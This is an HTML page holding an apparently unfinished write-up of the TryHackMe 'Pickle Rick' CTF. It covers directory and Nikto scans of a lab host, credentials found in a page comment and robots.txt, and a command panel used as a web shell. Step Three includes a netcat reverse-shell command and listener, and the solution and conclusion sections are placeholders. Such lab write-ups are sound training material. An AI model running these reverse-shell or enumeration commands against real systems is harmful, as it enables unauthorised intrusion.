<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>CTF Write-up: Pickle Rick</title>
    <link rel="stylesheet" href="styles.css">

    <!-- Favicon -->
    <link rel="icon" href="logo.png" type="image/png">
</head>
<body>
    <header>
        <h1>Andrew Hardiman</h1>
        <nav>
            <ul>
                <li><a href="#about">About Me</a></li>
                <li><a href="#portfolio">Portfolio</a></li>
                <li class="dropdown">
                    <a href="#">CTF Write-ups</a>
                    <ul class="dropdown-content">
                        <li><a href="hackthebox.html">Hack the Box</a></li>
                        <li><a href="tryhackme.html">Try Hack Me</a></li>
                    </ul>
                </li>
                <li><a href="#contact">Contact</a></li>
            </ul>
        </nav>
    </header>
    
    <main>
        <article>
            <h1>CTF Write-up: Pickle Rick</h1>
    
            <section id="introduction">
                <h2>Introduction</h2>
                <p>A Rick and Morty CTF. Help turn Rick back into a human!</p>
            </section>
            
            <section id="objective">
                <h2>Objective</h2>
                <p>This Rick and Morty-themed challenge requires you to exploit a web server and find three ingredients to help Rick make his potion and transform himself back into human from a pickle.</p>
            </section>
            
            <section id="setup">
                <h2>Setup</h2>
                <p>Either use the AttackBox or do it properly and use the VPN.</p>
                <img src="setup-image.png" alt="Setup screenshot">
            </section>
            
            <section id="One">
                <h2>Step One</h2>
                <p>Inspect the elements of the landing page. You will see that there is a comment with the username "R1ckRul3s". Write this down!</p>
                <img src="found_username.png" alt="Solution screenshot">
            </section>

            <section id="Two">
                <h2>Step Two</h2>
                <p>Enumerate the websites directories...</p>
                <pre><code>case@local:~$ gobuster dir -u http://10.10.236.162 -w /usr/share/wordlists/SecLists/Discovery/Web-Content/big.txt -t 64 -o rickCtfDirScan.txt 2>/dev/null</code></pre>
                <p>Let us also run a basic Nikto scan, as this will retrieve the headers advertisied by the webserver and will look for any sensitive files also...</p>
                <pre><code>case@local:~$ nikto -h http://10.10.236.162 -o rickCtfNiktoScan.txt</code></pre>
                <p>There is quite a lot that could be interesting to us in both of the scan output files. Firstly, there is a "robots.txt" file, identified by the gobuster scan. Typically this file is used by websites to give instructions to web crawlers. However, it might provide detail as to hidden directories or files, or even give clues to sensitive information. Let us see if we can request it directly in the URL...</p>
                <img src="robots_file.png" alt="Solution screenshot">
                <p>We can! This is non-standard content for the "robots.txt" file. Write this down! Is this the password for the username we found in step one?</p>
                <p>The contents of the nikto scan output file has this line "+ GET /login.php: Admin login page/section found.". Let us see if we can request that page, and if so, enter what we now believe to be valid credentials. What do you know, it worked, we are now logged in...</p>
                <img src="pickle_landing.png" alt="Solution screenshot">
            </section>

            <section id="Three">
                <h2>Step Three</h2>
                <p>We now have a active session on the site. Not only that, but we have been greeted with a ruddy web form with an input that is labelled as "Command Panel". Will this form execute shell commands for us? Let us try, enter "whoami" and hit enter...</p>
                <img src="pickle_form.png" alt="Solution screenshot">
                <p>We effectively have a web shell. "whoami" is showing we are currently logged in as "www-data". This is good. However, "www-data" is the commonly the user created when the web server software is installed and therefore, is typically, a low-privileged user created specifically for running web server processes. I wonder if we can submit the form with a command to open a network connection and execute a shell? Let us try with netcat. First we need a listener on our local/attacking machine.. </p>
                <pre><code>case@local:~$ sudo nc -lvnp 444</code></pre>
                <p>Now submit the command..</p>
                <pre><code>nc attacking_ip_address choosen_port -e /bin/bash</code></pre>
                <p>It did not work....</p>
                <img src="sad_morty.jpeg" alt="Solution screenshot">
            </section>
            
            <section id="solution">
                <h2>Solution</h2>
                <p>Final solution or flag...</p>
                <pre><code>command input here</code></pre>
                <pre><code>command output here</code></pre>
            </section>
            
            <section id="conclusion">
                <h2>Conclusion</h2>
                <p>Summary and lessons learned...</p>
            </section>
        </article>
    </main>

    <footer>
        <p>&copy; 2024 Andrew Hardiman. All rights reserved.</p>
    </footer>
</body>
</html>
